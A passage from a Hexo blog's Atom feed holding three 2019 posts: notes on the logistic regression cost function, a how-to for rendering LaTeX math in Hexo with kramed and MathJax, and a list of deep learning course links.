    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Given $x \in R^{n_x}$, want $\hat{y}=P(y=1\,|\,x) \in [0,1]$</p><h2 id="Logistic-Function"><a href="#Logistic-Function" class="headerlink" title="Logistic Function"></a>Logistic Function</h2><p>$\sigma(z) = \dfrac{1}{1+e^{-z}}$</p><img src="/images/loading.gif" data-original="/2019/02/16/016%20Logistic%20Regression%20(逻辑回归)/Sigmoid.png"><p>Suppose $w \in R^{n_x},\;b \in R$<br>$\hat{y}=\sigma ( w^{\tau}x + b )$</p><p>So $w$ and $b$ are the parameters we want to train</p><h2 id="Logistic-Regression-Cost-Function"><a href="#Logistic-Regression-Cost-Function" class="headerlink" title="Logistic Regression Cost Function"></a>Logistic Regression Cost Function</h2><p>$\hat{y}=\sigma ( w^{\tau}x + b )$, where $\sigma(z) = \dfrac{1}{1+e^{-z}}$<br>Given $\{(x^{(1)},y^{(1)}),(x^{(2)},y^{(2)}),\;…\;,(x^{(m)},y^{(m)})\}$, want $\hat{y}^{(i)} \approx y^{(i)}$</p><h3 id="Mean-squared-error-均方误差"><a href="#Mean-squared-error-均方误差" class="headerlink" title="Mean squared error (均方误差)"></a>Mean squared error (均方误差)</h3><p>$L(\hat{y}, y) = \dfrac{1}{2} (\hat{y} - y)^2$</p><p>We don’t use Mean squared error in Logistic Regression. Because that will make the cost function is no-convex.</p><h3 id="Cross-Entropy-交叉熵"><a href="#Cross-Entropy-交叉熵" class="headerlink" title="Cross Entropy (交叉熵)"></a>Cross Entropy (交叉熵)</h3><p>$L(\hat{y}, y) = -(ylog\hat{y} + (1-y)log(1-\hat{y}))$</p><h2 id="Cost-Function"><a href="#Cost-Function" class="headerlink" title="Cost Function"></a>Cost Function</h2><p>$J(w,b) = \dfrac{1}{m} \sum\limits_{i=1}^{m} L(\hat{y}^{(i)}, y^{(i)}) = -\dfrac{1}{m} \sum\limits_{i=1}^{m} (y^{(i)}log\hat{y}^{(i)} + (1-y^{(i)})log(1-\hat{y}^{(i)}))$</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://zhuanlan.zhihu.com/p/28408516" target="_blank" rel="noopener">逻辑回归（Logistic Regression）（一）</a><br>[2] <a href="https://zhuanlan.zhihu.com/p/28415991" target="_blank" rel="noopener">逻辑回归（Logistic Regression）（二）</a><br>[3] <a href="https://www.jianshu.com/p/1bf35d61995f" target="_blank" rel="noopener">Logistic Regression 为什么用极大似然函数</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Algorithm" scheme="https://vincentstudio.info/categories/Algorithm/"/>
    
    
      <category term="MachineLearning" scheme="https://vincentstudio.info/tags/MachineLearning/"/>
    
  </entry>
  
  <entry>
    <title>Render math formula in hexo</title>
    <link href="https://vincentstudio.info/2019/02/15/015%20Render%20math%20formula%20in%20hexo/"/>
    <id>https://vincentstudio.info/2019/02/15/015 Render math formula in hexo/</id>
    <published>2019-02-15T07:30:00.000Z</published>
    <updated>2019-04-07T07:09:57.352Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Feature"><a href="#Feature" class="headerlink" title="Feature"></a>Feature</h2><script type="math/tex; mode=display">\begin{equation} \begin{array}{lll}\nabla\times E &=& -\;\frac{\partial{B}}{\partial{t}}\     \nabla\times H &=& \frac{\partial{D}}{\partial{t}}+J\     \nabla\cdot D &=& \rho\     \nabla\cdot B &=& 0\ \end{array}\end{equation}</script><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><h3 id="Use-hexo-renderer-kramed"><a href="#Use-hexo-renderer-kramed" class="headerlink" title="Use hexo-renderer-kramed"></a>Use hexo-renderer-kramed</h3><pre><code class="lang-bash">$ npm uninstall hexo-renderer-marked --save$ npm install hexo-renderer-kramed --save</code></pre><h3 id="Insatll-mathjax"><a href="#Insatll-mathjax" class="headerlink" title="Insatll mathjax"></a>Insatll mathjax</h3><pre><code class="lang-bash">$ npm uninstall hexo-math --save$ npm install hexo-renderer-mathjax --save</code></pre><h3 id="Fix-mathjax-CDN"><a href="#Fix-mathjax-CDN" class="headerlink" title="Fix mathjax CDN"></a>Fix mathjax CDN</h3><p>edit /node_modules/hexo-renderer-mathjax/mathjax.html</p><pre><code class="lang-html">&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML&quot;&gt;&lt;/script&gt;</code></pre><h3 id="Fix-escape-bugs"><a href="#Fix-escape-bugs" class="headerlink" title="Fix escape bugs"></a>Fix escape bugs</h3><p>edit /node_modules/kramed/lib/rules/inline.js<br>find <code>escape</code> &amp; <code>em</code> regexp and change to</p><pre><code class="lang-text">escape: /^\\([`*\[\]()# +\-.!_&gt;])/,em: /^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</code></pre><h2 id="Enjoy-LaTeX"><a href="#Enjoy-LaTeX" class="headerlink" title="Enjoy LaTeX"></a>Enjoy LaTeX</h2><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><pre><code>$$\left\{\begin{matrix}1 &amp; 2 &amp; 3 \\4 &amp; 5 &amp; 6 \\7 &amp; 8 &amp; 9\end{matrix}\right\}$$</code></pre><script type="math/tex; mode=display">\left\{\begin{matrix}1 & 2 & 3 \\4 & 5 & 6 \\7 & 8 & 9\end{matrix}\right\}</script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Programming" scheme="https://vincentstudio.info/categories/Programming/"/>
    
    
      <category term="Hexo" scheme="https://vincentstudio.info/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Deep Learning 学习资料</title>
    <link href="https://vincentstudio.info/2019/02/14/014%20Deep%20Learning%20%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/"/>
    <id>https://vincentstudio.info/2019/02/14/014 Deep Learning 学习资料/</id>
    <published>2019-02-14T07:30:00.000Z</published>
    <updated>2019-04-25T16:34:40.810Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul><li><p>Andrew Ng 深度学习课程<br>视频地址：<a href="https://mooc.study.163.com/smartSpec/detail/1001319001.htm" target="_blank" rel="noopener">https://mooc.study.163.com/smartSpec/detail/1001319001.htm</a><br>离线下载：<a href="https://pan.baidu.com/s/1ciq3qHo0lgoD3MLRwfeqnA" target="_blank" rel="noopener">https://pan.baidu.com/s/1ciq3qHo0lgoD3MLRwfeqnA</a> 密码：0kim<br>课程笔记：<a href="https://github.com/fengdu78/deeplearning_ai_books" target="_blank" rel="noopener">https://github.com/fengdu78/deeplearning_ai_books</a></p></li><li><p>莫凡 Tensorflow 教程<br><a href="https://morvanzhou.github.io/tutorials/machine-learning/tensorflow/" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/machine-learning/tensorflow/</a></p></li><li><p>TensorFlow 官方教程<br><a href="https://www.tensorflow.org/tutorials" target="_blank" rel="noopener">https://www.tensorflow.org/tutorials</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Resources" scheme="https://vincentstudio.info/categories/Resources/"/>
    
    
      <category term="MachineLearning" scheme="https://vincentstudio.info/tags/MachineLearning/"/>
    
  </entry>
  
</feed>
